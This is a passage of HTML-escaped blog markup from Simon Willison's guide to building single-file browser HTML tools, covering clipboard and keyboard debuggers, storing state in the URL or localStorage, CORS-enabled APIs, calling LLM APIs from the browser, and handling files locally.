  &lt;a href="https://tools.simonwillison.net/alt-text-extractor" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/alt-text-extractor.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of alt-text-extractor" /&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;h4 id="build-debugging-tools"&gt;Build debugging tools&lt;/h4&gt;
&lt;p&gt;The key to building interesting HTML tools is understanding what's possible. Building custom debugging tools is a great way to explore these options.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/clipboard-viewer"&gt;clipboard-viewer&lt;/a&gt;&lt;/strong&gt; is one of my most useful. You can paste anything into it (text, rich text, images, files) and it will loop through and show you every type of paste data that's available on the clipboard.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2025/clipboard-viewer.jpg" alt="Clipboard Format Viewer. Paste anywhere on the page (Ctrl+V or Cmd+V). This shows text/rtf with a bunch of weird code, text/plain with some pasted HTML diff and a Clipboard Event Information panel that says Event type: paste, Formats available: text/rtf, text/plain, 0 files reported and 2 clipboard items reported." style="max-width: 100%;" /&gt;&lt;/p&gt;
&lt;p&gt;This was key to building many of my other tools, because it showed me the invisible data that I could use to bootstrap other interesting pieces of functionality.&lt;/p&gt;
&lt;p&gt;More debugging examples:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/keyboard-debug"&gt;keyboard-debug&lt;/a&gt;&lt;/strong&gt; shows the keys (and &lt;code&gt;KeyCode&lt;/code&gt; values) currently being held down.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/cors-fetch"&gt;cors-fetch&lt;/a&gt;&lt;/strong&gt; reveals if a URL can be accessed via CORS.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/exif"&gt;exif&lt;/a&gt;&lt;/strong&gt; displays EXIF data for a selected photo.&lt;/li&gt;
&lt;/ul&gt;
&lt;div style="display: flex; width: 100%; gap: 20px; margin-bottom: 1em;"&gt;
  &lt;a href="https://tools.simonwillison.net/keyboard-debug" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/keyboard-debug.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of keyboard-debug" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/cors-fetch" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/cors-fetch.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of cors-fetch" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/exif" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/exif.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of exif" /&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;h4 id="persist-state-in-the-url"&gt;Persist state in the URL&lt;/h4&gt;
&lt;p&gt;HTML tools may not have access to server-side databases for storage but it turns out you can store a &lt;em&gt;lot&lt;/em&gt; of state directly in the URL.&lt;/p&gt;
&lt;p&gt;I like this for tools I may want to bookmark or share with other people.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/icon-editor#cmdiKDIwMSwgNDYsIDg2KSxyZ2IoMjIzLCA0OCwgOTIpLHJnYigzNCwgODAsIDE3OSkscmdiKDIzNywgNTYsIDk1KSxyZ2IoMTgzLCA1MywgOTYpLHJnYigzOCwgMTA3LCAyMTApLHJnYigyMDQsIDY1LCAxMDUpLHJnYigxNzksIDEwMywgMTM2KSxyZ2IoMjMyLCA5NywgMTQ4KSxyZ2IoMzgsIDkxLCAyMDkpLHJnYigzNiwgOTUsIDIwNCkscmdiKDE5NSwgODYsIDEyOSkscmdiKDE3MywgMzEsIDU4KSxyZ2IoMjEyLCA2MSwgMTA2KSxyZ2IoOTIsIDEwNSwgMTg4KSxyZ2IoMjM3LCA3MSwgMTIzKSxyZ2IoMzksIDk2LCAyMTkpLHJnYigyOCwgODYsIDIxMCkscmdiKDIyMywgMjEyLCAzNCkscmdiKDE3MywgMTUzLCAyNikscmdiKDE0NCwgNzksIDI4KSxyZ2IoMjI0LCA1NiwgOTcpLHJnYigxOTYsIDQ4LCA4NSkscmdiKDIyMCwgNTAsIDk4KSxyZ2IoMTY2LCAxMjYsIDI1KSxyZ2IoMjA5LCAxMzAsIDE5KSxyZ2IoMTg3LCAxMTQsIDEzKSxyZ2IoMTQ3LCAxMDQsIDE4KSxyZ2IoMjE2LCA1OCwgODEpLHJnYigxNTIsIDM5LCA2NCkscmdiKDMyLCA3NSwgMTczKSxyZ2IoMTY2LCAxMjYsIDI5KSxyZ2IoMjM3LCAxODAsIDU0KSxyZ2IoMjA0LCAxMzgsIDIyKSxyZ2IoMTgxLCAxMjksIDIzKSxyZ2IoMjM0LCA4NiwgNzYpLHJnYigxOTAsIDY4LCA3NSkscmdiKDI0NSwgODksIDEzNSkscmdiKDIxMywgNjcsIDExMSkscmdiKDE0MSwgMzEsIDU2KSxyZ2IoNzIsIDc5LCAxMTYpLHJnYigxODcsIDE1NCwgNTIpLHJnYigyMDcsIDE3OSwgNzIpLHJnYigyMTAsIDE2MiwgNDMpLHJnYigyMTQsIDE0OSwgMzEpLHJnYigyMzksIDkwLCA4NCkscmdiKDIzNSwgMTMyLCA3NykscmdiKDE4MSwgMTM4LCAyOSkscmdiKDI0NSwgMTI4LCAxNzgpLHJnYigyMTcsIDk5LCAxNDUpLHJnYigxMTYsIDEwNSwgMTIyKSxyZ2IoMjA2LCAxNzYsIDY1KSxyZ2IoMTkxLCAxNjMsIDY0KSxyZ2IoMjA1LCAxNjksIDU4KSxyZ2IoMjM2LCAxNjUsIDQ2KSxyZ2IoMjM3LCA3OSwgODUpLHJnYigyMzUsIDE0NCwgODcpLHJnYigyNDksIDIwMiwgNDUpLHJnYigyMTAsIDE2NiwgMzQpLHJnYigyMjcsIDEwMywgMTYyKSxyZ2IoMjEzLCA5MCwgMTMwKSxyZ2IoNDQsIDQ4LCAxMjMpLHJnYigxMjUsIDg2LCAxNTEpLHJnYigxOTAsIDE2MywgMTA2KSxyZ2IoMTk5LCAxNjYsIDQ4KSxyZ2IoMjAyLCAxNjQsIDU2KSxyZ2IoMjIxLCAxNzAsIDUzKSxyZ2IoMjM0LCAxMzUsIDc1KSxyZ2IoMjQxLCAxNzUsIDc1KSxyZ2IoMjU1LCAyMjIsIDY1KSxyZ2IoMjU0LCAyMjYsIDY5KSxyZ2IoMjM1LCAyMDEsIDQ0KSxyZ2IoNzMsIDEzNywgMjQ3KSxyZ2IoODAsIDE0MywgMjQ4KSxyZ2IoNzksIDEzOSwgMjQzKSxyZ2IoMTM4LCA5MiwgMTc0KSxyZ2IoMTU2LCAxMTMsIDE3NikscmdiKDIwMSwgMTY4LCA2MykscmdiKDIxMSwgMTY5LCA0NikscmdiKDIxNCwgMTcxLCA1NSkscmdiKDIyOCwgMTgyLCA1NikscmdiKDI0MywgMTk1LCA1OCkscmdiKDI0NSwgMjA0LCA2NykscmdiKDI1NSwgMjIxLCA2NykscmdiKDI1NSwgMjI2LCA2OCkscmdiKDE1NCwgMTYyLCAxMzMpLHJnYigyNiwgMTA1LCAyNTUpLHJnYig2OCwgMTI5LCAyNTIpLHJnYig4NywgMTM1LCAyNDQpLHJnYig4MywgMTMxLCAyMzUpLHJnYig4MiwgMTI3LCAyMjYpLHJnYig4NSwgMTMwLCAyMjcpLHJnYig3OSwgMTIyLCAyMTgpLHJnYigxNjcsIDE0NiwgMzIpLHJnYigxNzQsIDEzOCwgMTI0KSxyZ2IoMTMzLCA2OSwgMjA1KSxyZ2IoMTcxLCAxMjAsIDE0NCkscmdiKDIxNSwgMTc2LCA1NykscmdiKDIyMCwgMTc1LCA0OSkscmdiKDIyMywgMTc5LCA1OCkscmdiKDIzNywgMTg4LCA2MCkscmdiKDI0MSwgMTkxLCA1NikscmdiKDIwMCwgMTc2LCAxMDUpLHJnYigxMTIsIDE0MSwgMjAzKSxyZ2IoODQsIDEyNywgMjM1KSxyZ2IoMTE1LCAxMzgsIDE5MSkscmdiKDgyLCAxMDMsIDE3NCkscmdiKDE1OCwgNDEsIDc2KSxyZ2IoMTcwLCA0MywgNjQpLHJnYigxOTAsIDE1NywgNTApLHJnYigyMDMsIDE3NywgNjUpLHJnYigxNjEsIDEwMiwgMTQyKSxyZ2IoMTQxLCA1OSwgMjA5KSxyZ2IoMTgwLCAxMjIsIDE1MSkscmdiKDIyOCwgMTg1LCA1OCkscmdiKDIzMywgMTg2LCA1MikscmdiKDI0MCwgMTg5LCA2NikscmdiKDI1NCwgMjEwLCA2OCkscmdiKDIwMSwgMTkxLCAxMTMpLHJnYigxMzcsIDEzOSwgMTU3KSxyZ2IoMjExLCAxNjIsIDg4KSxyZ2IoMjUwLCAyMDAsIDUwKSxyZ2IoMTc5LCAxMzEsIDIzKSxyZ2IoMTk2LCAxNjUsIDY0KSxyZ2IoMjA1LCAxNzQsIDU0KSxyZ2IoMjA5LCAxNjAsIDU5KSxyZ2IoMTY2LCA5MSwgMTYxKSxyZ2IoMTQyLCA2MCwgMjIzKSxyZ2IoMTk3LCAxMzksIDE1MCkscmdiKDI0MCwgMTk2LCA3MikscmdiKDI1MSwgMjA4LCA2MSkscmdiKDI1NSwgMjI0LCA4MCkscmdiKDI1NSwgMjUwLCA5MikscmdiKDI1NSwgMjM0LCA4OSkscmdiKDI0OSwgMTg2LCA1MSkscmdiKDI1MCwgMTgwLCAzOSkscmdiKDI0MCwgMTY2LCAzNSkscmdiKDIwMiwgMTc0LCA3MikscmdiKDIxNSwgMTY4LCA1MCkscmdiKDIyMiwgMTc1LCA0MykscmdiKDIxMiwgMTY1LCA2OSkscmdiKDE3NCwgMTAzLCAxNjcpLHJnYigxNjAsIDc4LCAyMzQpLHJnYigyMDUsIDE0NiwgMTg0KSxyZ2IoMjQ3LCAyMTgsIDEwOCkscmdiKDI1NSwgMjQ4LCA4NSkscmdiKDI1NSwgMjU1LCAxMDIpLHJnYigyNTUsIDI1NSwgMTIyKSxyZ2IoMjQwLCAyMTAsIDgyKSxyZ2IoMjE0LCAxNTAsIDMxKSxyZ2IoMjI0LCAxNTAsIDI1KSxyZ2IoMTc2LCAxMjEsIDI1KSxyZ2IoMTg5LCAxODMsIDUyKSxyZ2IoMTIyLCA4MCwgMTU4KSxyZ2IoMTkxLCAxNTEsIDEyMikscmdiKDIyOSwgMTc0LCA0MCkscmdiKDIyNSwgMTcyLCA1MSkscmdiKDIyOSwgMTg1LCA1MSkscmdiKDIzNywgMTkwLCA2MCkscmdiKDIwOSwgMTQ2LCAxNjEpLHJnYigxOTUsIDExNywgMjUxKSxyZ2IoMjI1LCAxNTUsIDIzOSkscmdiKDI1NCwgMjI3LCAxODQpLHJnYigyNTUsIDI1NSwgMTE3KSxyZ2IoMjQ5LCAyMzcsIDc2KSxyZ2IoMjA0LCAxNjcsIDU1KSxyZ2IoMTU3LCAxMTUsIDI1KSxyZ2IoMTM1LCA5OCwgMTYpLHJnYigyMDMsIDEyNSwgNTcpLHJnYigxOTgsIDEyNSwgNTMpLHJnYigxNTcsIDExMCwgMTQ0KSxyZ2IoMTQ5LCA4NCwgMTk0KSxyZ2IoMjEyLCAxNTcsIDk0KSxyZ2IoMjMyLCAxODUsIDQ3KSxyZ2IoMjM1LCAxODYsIDYyKSxyZ2IoMjUwLCAyMDQsIDY1KSxyZ2IoMjUzLCAyMzIsIDgxKSxyZ2IoMjQzLCAyMTUsIDE0OCkscmdiKDI0NywgMTgzLCAyMzMpLHJnYigyNDMsIDE2MywgMjUwKSxyZ2IoMTk4LCAxMzgsIDE3NSkscmdiKDE2MCwgMTEzLCA4MikscmdiKDEyNCwgODksIDM3KSxyZ2IoMTU3LCAxMzYsIDM2KSxyZ2IoMjAzLCAxNjQsIDgyKSxyZ2IoMTQ4LCA3MiwgMTg5KSxyZ2IoMTU4LCA4NCwgMjA0KSxyZ2IoMjE3LCAxNjgsIDExNykscmdiKDI1MCwgMjEwLCA2NykscmdiKDI1NSwgMjI5LCA3OCkscmdiKDI1NSwgMjU1LCA5NikscmdiKDI1NSwgMjU1LCA5NCkscmdiKDI0MywgMjE4LCA5NSkscmdiKDE3OCwgMTE4LCAxMDYpLHJnYigxMDMsIDQwLCAxMDIpLHJnYigxODgsIDExMSwgMjcpLHJnYigxODMsIDE1NiwgNTkpLHJnYigyMTUsIDE3NiwgNDgpLHJnYigyMDMsIDE0OCwgOTEpLHJnYigxNjcsIDg5LCAxOTcpLHJnYigxNzgsIDEwMywgMjM1KSxyZ2IoMjM1LCAxOTMsIDE3NSkscmdiKDI1NSwgMjUxLCAxMjQpLHJnYigyNDksIDI0MCwgOTIpLHJnYigyMTMsIDE4NiwgNjApLHJnYigxNjAsIDEyMSwgMjEpLHJnYigxOTEsIDE1NSwgMTA4KSxyZ2IoMjIxLCAxODAsIDQwKSxyZ2IoMjM3LCAxODksIDQ3KSxyZ2IoMjMzLCAxODYsIDk2KSxyZ2IoMjE5LCAxNjIsIDIwNykscmdiKDIzMSwgMTU5LCAyNDkpLHJnYigyMTAsIDE1OCwgMTkxKSxyZ2IoMTY5LCAxMzAsIDc1KSxyZ2IoMTQwLCA5NiwgMTE5KSxyZ2IoMTU1LCA4NSwgMjAwKSxyZ2IoMjA5LCAxNTcsIDExNSkscmdiKDI1NCwgMjI2LCA3MCkscmdiKDI1NSwgMjU1LCA4MCkscmdiKDIzNSwgMjE3LCA3NikscmdiKDE3OCwgMTMzLCA5MSkscmdiKDIwOSwgMTEwLCAxNTEpLHJnYigxNTIsIDExOCwgNTYpLHJnYigxODYsIDExNiwgMTY4KSxyZ2IoMTkzLCAxMjEsIDIzNikscmdiKDIyOSwgMTk1LCAxNjEpLHJnYigxOTcsIDE4MCwgNzUpLHJnYigxOTksIDE1OCwgNzApLHJnYigxOTcsIDE0OCwgMTM2KXxfX19fX19fXzAxX19fX19fX19fX19fX19fMl9fX19fX18zNDVfX19fX182X183OF9fOWFfX19fX2JjZGVfX19fX19fX19fZl9fX2doX2lqa19fbF9fX19fX19fbV9uX19fX19fX19vcHFyc19fX19fX19fdF9fX19fX3VfX192d3h5ejEwX19fMTExMl9fMTNfX19fX19fX18xNDE1MTYxNzE4MTkxYTFiX18xYzFkX19fX19fX19fX19fMWUxZjFnMWgxaTFqMWsxbDFtXzFuMW9fX19fX19fX19fXzFwMXExcjFzMXQxdTF2MXcxeDF5MXpfX19fXzIwMjEyMl9fX19fXzIzMjQyNTI2MjcyODI5MmEyYjJjMmQyZTJmMmcyaDJpMmoya19fX19fMmwybTJuMm8ycDJxMnIyczJ0MnUydjJ3MngyeV9fX19fX19fMnozMDMxMzIzMzM0MzUzNjM3MzgzOTNhM2IzYzNkM2VfX19fX19fX19fM2YzZzNoM2kzajNrM2wzbTNuM28zcDNxM3Izc19fX19fX19fX18zdDN1M3YzdzN4M3kzejQwNDE0MjQzNDQ0NTQ2NDc0OF9fX19fX180OTRhNGI0YzRkNGU0ZjRnNGg0aTRqNGs0bDRtNG5fX180bzRwX19fXzRxNHI0czR0NHU0djR3NHg0eTR6NTA1MTUyX19fX19fX19fXzUzNTQ1NTU2NTc1ODU5NWE1YjVjNWQ1ZV9fX19fXzVmX19fX181ZzVoNWk1ajVrNWw1bTVuNW81cF9fX19fX19fX19fX19fNXE1cjVzNXQ1dTV2NXc1eF9fX19fX19fX19fX19fXzV5NXo2MDYxNjI2MzY0X19fX19fX19fX19fNjVfX19fNjY2NzY4Njk2YV9fX19fX19fX19fX19fX19fX19fNmI2Y19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19f"&gt;icon-editor&lt;/a&gt;&lt;/strong&gt; is a custom 24x24 icon editor I built to help hack on icons for &lt;a href="https://simonwillison.net/2025/Oct/28/github-universe-badge/"&gt;the GitHub Universe badge&lt;/a&gt;. It persists your in-progress icon design in the URL so you can easily bookmark and share it.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id="use-localstorage-for-secrets-or-larger-state"&gt;Use localStorage for secrets or larger state&lt;/h4&gt;
&lt;p&gt;The &lt;a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage"&gt;localStorage&lt;/a&gt; browser API lets HTML tools store data persistently on the user's device, without exposing that data to the server.&lt;/p&gt;
&lt;p&gt;I use this for larger pieces of state that don't fit comfortably in a URL, or for secrets like API keys which I really don't want anywhere near my server  - even static hosts might have server logs that are outside of my influence.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/word-counter"&gt;word-counter&lt;/a&gt;&lt;/strong&gt; is a simple tool I built to help me write to specific word counts, for things like conference abstract submissions. It uses localStorage to save as you type, so your work isn't lost if you accidentally close the tab.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/render-markdown"&gt;render-markdown&lt;/a&gt;&lt;/strong&gt; uses the same trick - I sometimes use this one to craft blog posts and I don't want to lose them.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/haiku"&gt;haiku&lt;/a&gt;&lt;/strong&gt; is one of a number of LLM demos I've built that request an API key from the user (via the &lt;code&gt;prompt()&lt;/code&gt; function) and then store that in &lt;code&gt;localStorage&lt;/code&gt;. This one uses Claude Haiku to write haikus about what it can see through the user's webcam.&lt;/li&gt;
&lt;/ul&gt;
&lt;div style="display: flex; width: 100%; gap: 20px; margin-bottom: 1em;"&gt;
  &lt;a href="https://tools.simonwillison.net/word-counter" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/word-counter.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of word-counter" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/render-markdown" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/render-markdown.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of render-markdown" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/haiku" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/haiku.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of haiku" /&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;h4 id="collect-cors-enabled-apis"&gt;Collect CORS-enabled APIs&lt;/h4&gt;
&lt;p&gt;CORS stands for &lt;a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing"&gt;Cross-origin resource sharing&lt;/a&gt;. It's a relatively low-level detail which controls if JavaScript running on one site is able to fetch data from APIs hosted on other domains.&lt;/p&gt;
&lt;p&gt;APIs that provide open CORS headers are a goldmine for HTML tools. It's worth building a collection of these over time.&lt;/p&gt;
&lt;p&gt;Here are some I like:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;iNaturalist for fetching sightings of animals, including URLs to photos&lt;/li&gt;
&lt;li&gt;PyPI for fetching details of Python packages&lt;/li&gt;
&lt;li&gt;GitHub because anything in a public repository in GitHub has a CORS-enabled anonymous API for fetching that content from the raw.githubusercontent.com domain, which is behind a caching CDN so you don't need to worry too much about rate limits or feel guilty about adding load to their infrastructure.&lt;/li&gt;
&lt;li&gt;Bluesky for all sorts of operations&lt;/li&gt;
&lt;li&gt;Mastodon has generous CORS policies too, as used by applications like &lt;a href="https://phanpy.social/"&gt;phanpy.social&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;GitHub Gists are a personal favorite here, because they let you build apps that can persist state to a permanent Gist through making a cross-origin API call.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/species-observation-map#%7B%22taxonId%22%3A123829%2C%22taxonName%22%3A%22California%20Brown%20Pelican%22%2C%22days%22%3A%2230%22%7D"&gt;species-observation-map&lt;/a&gt;&lt;/strong&gt; uses iNaturalist to show a map of recent sightings of a particular species.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/zip-wheel-explorer?package=llm"&gt;zip-wheel-explorer&lt;/a&gt;&lt;/strong&gt; fetches a &lt;code&gt;.whl&lt;/code&gt; file for a Python package from PyPI, unzips it (in browser memory) and lets you navigate the files.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/github-issue-to-markdown?issue=https%3A%2F%2Fgithub.com%2Fsimonw%2Fsqlite-utils%2Fissues%2F657"&gt;github-issue-to-markdown&lt;/a&gt;&lt;/strong&gt; fetches issue details and comments from the GitHub API (including expanding any permanent code links) and turns them into copyable Markdown.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/terminal-to-html"&gt;terminal-to-html&lt;/a&gt;&lt;/strong&gt; can optionally save the user's converted terminal session to a Gist.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/bluesky-quote-finder?post=https%3A%2F%2Fbsky.app%2Fprofile%2Fsimonwillison.net%2Fpost%2F3m7auwt3ma222"&gt;bluesky-quote-finder&lt;/a&gt;&lt;/strong&gt; displays quotes of a specified Bluesky post, which can then be sorted by likes or by time.&lt;/li&gt;
&lt;/ul&gt;
&lt;div style="display: flex; width: 100%; gap: 20px; margin-bottom: 1em;"&gt;
  &lt;a href="https://tools.simonwillison.net/species-observation-map#%7B%22taxonId%22%3A123829%2C%22taxonName%22%3A%22California%20Brown%20Pelican%22%2C%22days%22%3A%2230%22%7D" style="flex: 1; width: 20%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/species-observation-map.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of species-observation-map" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/zip-wheel-explorer?package=llm" style="flex: 1; width: 20%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/zip-wheel-explorer.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of zip-wheel-explorer" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/github-issue-to-markdown?issue=https%3A%2F%2Fgithub.com%2Fsimonw%2Fsqlite-utils%2Fissues%2F657" style="flex: 1; width: 20%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/github-issue-to-markdown.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of github-issue-to-markdown" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/terminal-to-html" style="flex: 1; width: 20%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/terminal-to-html.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of terminal-to-html" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/bluesky-quote-finder?post=https%3A%2F%2Fbsky.app%2Fprofile%2Fsimonwillison.net%2Fpost%2F3m7auwt3ma222" style="flex: 1; width: 20%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/bluesky-quote-finder.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of bluesky-quote-finder" /&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;h4 id="llms-can-be-called-directly-via-cors"&gt;LLMs can be called directly via CORS&lt;/h4&gt;
&lt;p&gt;All three of OpenAI, Anthropic and Gemini offer JSON APIs that can be accessed via CORS directly from HTML tools.&lt;/p&gt;
&lt;p&gt;Unfortunately you still need an API key, and if you bake that key into your visible HTML anyone can steal it and use to rack up charges on your account.&lt;/p&gt;
&lt;p&gt;I use the &lt;code&gt;localStorage&lt;/code&gt; secrets pattern to store API keys for these services. This sucks from a user experience perspective - telling users to go and create an API key and paste it into a tool is a lot of friction - but it does work.&lt;/p&gt;
&lt;p&gt;Some examples:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/haiku"&gt;haiku&lt;/a&gt;&lt;/strong&gt; uses the Claude API to write a haiku about an image from the user's webcam.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/openai-audio-output"&gt;openai-audio-output&lt;/a&gt;&lt;/strong&gt; generates audio speech using OpenAI's GPT-4o audio API.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="http://tools.simonwillison.net/gemini-bbox"&gt;gemini-bbox&lt;/a&gt;&lt;/strong&gt; demonstrates Gemini 2.5's ability to return complex shaped image masks for objects in images, see &lt;a href="https://simonwillison.net/2025/Apr/18/gemini-image-segmentation/"&gt;Image segmentation using Gemini 2.5&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;div style="display: flex; width: 100%; gap: 20px; margin-bottom: 1em;"&gt;
  &lt;a href="https://tools.simonwillison.net/haiku" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/haiku.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of haiku" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/openai-audio-output" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/openai-audio-output.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of openai-audio-output" /&gt;&lt;/a&gt;
  &lt;a href="http://tools.simonwillison.net/gemini-bbox" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/gemini-bbox.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of gemini-bbox" /&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;h4 id="don-t-be-afraid-of-opening-files"&gt;Don't be afraid of opening files&lt;/h4&gt;
&lt;p&gt;You don't need to upload a file to a server in order to make use of the &lt;code&gt;&amp;lt;input type="file"&amp;gt;&lt;/code&gt; element. JavaScript can access the content of that file directly, which opens up a wealth of opportunities for useful functionality.&lt;/p&gt;
&lt;p&gt;Some examples:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/ocr"&gt;ocr&lt;/a&gt;&lt;/strong&gt; is the first tool I built for my collection, described in &lt;a href="https://simonwillison.net/2024/Mar/30/ocr-pdfs-images/"&gt;Running OCR against PDFs and images directly in your browser&lt;/a&gt;. It uses &lt;code&gt;PDF.js&lt;/code&gt; and &lt;code&gt;Tesseract.js&lt;/code&gt; to allow users to open a PDF in their browser which it then converts to an image-per-page and runs through OCR.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/social-media-cropper"&gt;social-media-cropper&lt;/a&gt;&lt;/strong&gt; lets you open (or paste in) an existing image and then crop it to common dimensions needed for different social media platforms - 2:1 for Twitter and LinkedIn, 1.4:1 for Substack etc.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/ffmpeg-crop"&gt;ffmpeg-crop&lt;/a&gt;&lt;/strong&gt; lets you open and preview a video file in your browser, drag a crop box within it and then copy out the &lt;code&gt;ffmpeg&lt;/code&gt; command needed to produce a cropped copy on your own machine.&lt;/li&gt;
&lt;/ul&gt;
&lt;div style="display: flex; width: 100%; gap: 20px; margin-bottom: 1em;"&gt;
  &lt;a href="https://tools.simonwillison.net/ocr" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/ocr.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of ocr" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/social-media-cropper" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/social-media-cropper.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of social-media-cropper" /&gt;&lt;/a&gt;
  &lt;a href="https://tools.simonwillison.net/ffmpeg-crop" style="flex: 1; width: 30%; border: none;"&gt;&lt;img src="https://static.simonwillison.net/static/2025/html-tools/ffmpeg-crop.jpg" loading="lazy" style="width: 100%; height: auto; object-fit: cover;" alt="screenshot of ffmpeg-crop" /&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;h4 id="you-can-offer-downloadable-files-too"&gt;You can offer downloadable files too&lt;/h4&gt;
&lt;p&gt;An HTML tool can generate a file for download without needing help from a server.&lt;/p&gt;
&lt;p&gt;The JavaScript library ecosystem has a huge range of packages for generating files in all kinds of useful formats.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/svg-render"&gt;svg-render&lt;/a&gt;&lt;/strong&gt; lets the user download the PNG or JPEG rendered from an SVG.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/social-media-cropper"&gt;social-media-cropper&lt;/a&gt;&lt;/strong&gt; does the same for cropped images.&lt;/li&gt;
&lt;li&gt;
